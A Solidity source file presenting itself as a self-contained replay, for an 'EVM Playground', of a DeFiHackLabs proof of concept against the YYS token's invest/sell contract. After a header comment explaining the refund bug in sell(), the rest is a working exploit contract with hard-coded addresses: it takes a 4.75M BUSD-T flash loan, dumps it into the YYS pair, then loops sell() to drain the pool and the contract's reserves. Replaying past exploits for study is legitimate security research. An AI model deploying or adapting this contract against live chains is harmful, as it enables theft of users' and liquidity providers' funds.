// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-YYS).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the PancakeSwap V3 flash-loan callback `pancakeV3FlashCallback`
// lives on the test itself (`attacker = address(this)`), and there is no
// standalone attack contract to deploy. This file is a faithful, self-contained
// copy of that inline attack (testExploit body + flash callback + minimal
// inline interfaces — no imports so it compiles anywhere), compiled inside the
// registry forge project. Logic and constants are copied verbatim from
// test/YYS_exp.sol.
//
// Root cause: the (unverified) "invest/sell" reward contract at 0xcC0F… exposes
// sell(uint256 amount) which pulls the seller's YYS in, pays the seller BUSD-T
// (either by swapping YYS->BUSD-T on the public pair, or — for a large enough
// sale — by redeeming the CONTRACT'S OWN LP on the YYS/BUSD-T pair and sending
// the underlying BUSD-T+YYS to the seller), and then — the bug — transfers the
// SAME YYS amount it just pulled BACK to the seller. The seller keeps (almost)
// all of their YYS while also receiving the BUSD-T proceeds, so sell() can be
// looped with the same stock, draining the pool's BUSD-T and the contract's own
// LP-backed reserves. A flash loan just supplies the working capital to dump
// into the thin YYS/BUSD-T pool and mint a large starting YYS position.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouterMin {
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

interface ISellMin {
    function sell(uint256) external;
}

contract YYSDrain {
    // --- constants copied verbatim from test/YYS_exp.sol -----------------------
    IUniPairV3 constant BUSDT_USDC = IUniPairV3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IERC20Min constant BUSDT = IERC20Min(0x55d398326f99059fF775485246999027B3197955);
    IERC20Min constant YYStoken = IERC20Min(0xE814Cc2B4DbFe652C04f2E008ced18875c76F510);
    IUniPairV2 constant Pair = IUniPairV2(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F);
    IPancakeRouterMin constant Router = IPancakeRouterMin(0x8228A4aD192d5D82189afd6e194f65edb8c76a41);
    uint256 constant flashBUSDTAmount = 4_750_000 ether;
    ISellMin constant YYStoken_Sell = ISellMin(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9);
    address constant invest = 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9;
    address constant Anotheraddress = 0xC772718b5206EF788D33F43A2a80a104a1867BD4;

    // step 1: register (bind an upline) so the caller may later use sell(); then
    // borrow the flash-loan war chest and let the callback below do the rest.
    // (The registry harness pre-funds `address(this)` with 100 BUSD-T and
    // approves `invest` for max — mirrored here since there is no setUp() in
    // the synthetic replay.)
    function run() external {
        BUSDT.approve(invest, type(uint256).max);
        // Step1: invest — any address that has been bound before can be used.
        invest.call(abi.encodeWithSelector(bytes4(0xb9b8c246), Anotheraddress, 100 ether));

        // Step2: start the attack.
        BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, abi.encodePacked(uint256(1)));
    }

    // PancakeSwap V3 flash-loan callback. Dumps the borrowed BUSD-T into the
    // thin YYS/BUSD-T pair to mint a large YYS position, then loops sell() on
    // the invest contract — each call pays out BUSD-T (from the pool or the
    // contract's own LP) AND refunds the YYS just sold, so the position never
    // meaningfully shrinks until the loop's exit threshold.
    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        Pair.sync();
        BUSDT.approve(address(Router), flashBUSDTAmount);

        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(YYStoken);

        uint256[] memory amountsout = Router.getAmountsOut(4_749_900 * 10 ** 18, path);

        BUSDT.transfer(address(Pair), 4_749_900 ether);
        Pair.swap(0, amountsout[1], address(this), "");

        YYStoken.approve(address(YYStoken_Sell), type(uint256).max);

        uint256 sellamount = 38_584 ether;
        uint256 j = 0;
        while (YYStoken.balanceOf(address(this)) > 5000 ether) {
            if (j == 0) {
                YYStoken_Sell.sell(sellamount);
            } else {
                YYStoken_Sell.sell(YYStoken.balanceOf(address(this)));
            }
            j++;
        }
        BUSDT.transfer(msg.sender, flashBUSDTAmount * 10_001 / 10_000);
    }
}
